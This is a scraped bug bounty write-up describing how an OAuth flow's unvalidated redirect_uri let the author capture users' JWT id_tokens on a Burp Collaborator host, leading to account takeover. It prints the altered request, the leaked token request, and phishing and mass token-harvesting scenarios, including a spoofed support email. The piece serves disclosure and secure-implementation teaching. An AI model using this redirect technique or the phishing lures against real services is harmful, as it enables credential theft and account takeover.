---
title: "Stealing JWT Tokens via OAuth redirect_uri Manipulation: A Critical Vulnerability"
author: Shah kaif (@SKaif009)
url: https://infosecwriteups.com/stealing-jwt-tokens-via-oauth-redirect-uri-manipulation-a-critical-vulnerability-abbd579b5443
date_published: 2025-10-03
date_scraped: 2026-11-17
platform: medium
disclosed_report: none
bounty: not stated
vuln_class: access-control
---

<!-- Raw scraped text below. Public, non-paywalled content only. -->
<!-- Scrape note: full article publicly readable (not member-only). Images omitted. -->

Published in InfoSec Write-ups. 4 min read. Oct 3, 2025. Tags: Bug Bounty, Bug Bounty Tips, Bug Bounty Writeup.

By Shah kaif | "A single redirect_uri = complete JWT theft."

## Introduction

During a bug bounty engagement, I discovered a critical OAuth implementation flaw that allowed me to steal user JWT authentication tokens simply by manipulating the `redirect_uri` parameter. What started as a routine test of an OAuth flow turned into a complete account takeover vulnerability affecting any authenticated user who clicked a malicious link.

## How I Found the Vulnerability

### First step is Recon

I Follow recon steps from BountyBuddy [BountyBuddy has advanced recon checklist] and when i complete recon i follow steps to find open-redirect vulnerability which is also given in BountyBuddy [https://recon.vulninsights.codes].

### The Application Architecture

The target application consisted of two main domains:

- **app.domain.com** - Main application with user authentication
- **support.domain.com** - Support portal with integrated chatbot

The chatbot on `app.domain.com` had a "Support Ticket" button that triggered an OAuth flow to authenticate users on the support portal.

## Discovery Process

**Step 1: Intercepting the OAuth Flow**

When I clicked the "Support Ticket" link, I noticed an OAuth redirect being initiated. I intercepted this request using Burp Suite's Proxy:

```
GET /account/freshworks/jwt/customer?
response_type=id_token&
client_id=3128979333002483118&
scope=openid%20email%20profile&
state=fwst_b0c44dcc410cb7fb50b19893d&
redirect_uri=https://support.domain.com/callback
```

**Step 2: Testing redirect_uri Parameter**

The `redirect_uri` parameter immediately caught my attention. I decided to test if it was properly validated by changing it to `https://google.com`:

```
redirect_uri=https://google.com
```

The result? The application showed a "Login Successful!" page with a redirect button that sent me to Google. This confirmed the vulnerability existed, but I needed to understand its true impact.

after Clicking that **Go to Support Portal**.

**Step 3: Setting Up Burp Collaborator**

To test if I could capture sensitive data, I replaced the redirect URI with my Burp Collaborator server:

```
redirect_uri=https://1aciyh2llknkrci6hdujaj5twznndb2.oastify.com
```

**Step 4: The Critical Discovery**

After forwarding the modified request, something shocking appeared in my Burp Collaborator client - **DNS and HTTP interactions showing the JWT token being leaked!**

The Collaborator captured:

```
GET /?id_token=eyJzdG1iOiJ5UzI1NiI5...eyJ5dmMuY29t&
client_id=3128979333002483118&
state=fwst_b0c44dcc410cb7fb50b19893d
```

The complete JWT authentication token was being sent to my attacker-controlled server as a URL parameter!

## Why This Works

### The Session Dependency

This vulnerability only works when the victim is **already authenticated** on `app.domain.com`. This is actually what makes it dangerous:

- Targeted attacks against active users
- Higher success rate (authenticated users trust support links)
- Difficult to detect without proper monitoring

### The Technical Flaw

The application fails at multiple security levels:

1. **No redirect_uri validation** - Accepts any external domain
2. **JWT in URL parameters** - Sensitive tokens exposed in URLs
3. **No origin verification** - Doesn't validate the requesting domain
4. **Token leakage via redirect** - Automatically sends tokens to untrusted domains

## Real-World Attack Scenarios

### Scenario 1: Targeted Phishing Campaign

```
From: support@domain.com (spoofed)
Subject: Urgent: Your Support Ticket Requires Attention
```

```
Dear User,Your recent support ticket needs immediate verification.
Click here to review: [malicious OAuth URL]Best regards,
Support Team
```

When authenticated users click this link, their JWT tokens are instantly captured.

### Scenario 2: Mass Token Harvesting

Attacker creates a legitimate-looking support announcement:

- Posts on social media or forums
- Includes malicious OAuth URL
- Collects JWT tokens from all authenticated users who click
- Builds database of compromised accounts

### Scenario 3: Business Email Compromise

- Attacker targets employees of a company
- Sends internal-looking email about support portal updates
- Steals JWT tokens of multiple employees
- Gains access to corporate accounts and sensitive data

## Key Takeaways

1. **OAuth redirect_uri must be strictly validated** - Never trust user-supplied redirect destinations
2. **JWT tokens should never appear in URLs** - URLs are logged, cached, and can leak in many ways
3. **Implicit flow is dangerous** - Modern applications should use Authorization Code Flow with PKCE
4. **Session state matters** - Test vulnerabilities in different authentication states
5. **Burp Collaborator is powerful** - Essential tool for detecting data exfiltration vulnerabilities

## Conclusion

What began as a simple open redirect test evolved into a critical account takeover vulnerability. By leveraging Burp Collaborator, I demonstrated that the flaw wasn't just about redirecting users - it was about stealing their complete authentication credentials.

This case highlights the importance of:

- Thorough testing of OAuth implementations
- Understanding the full impact of seemingly simple vulnerabilities
- Using the right tools (Burp Collaborator) to prove impact
- Following OAuth security best practices

The vulnerability has been responsibly disclosed and patched. This writeup serves as an educational resource for security researchers and developers to understand the critical importance of proper OAuth implementation.
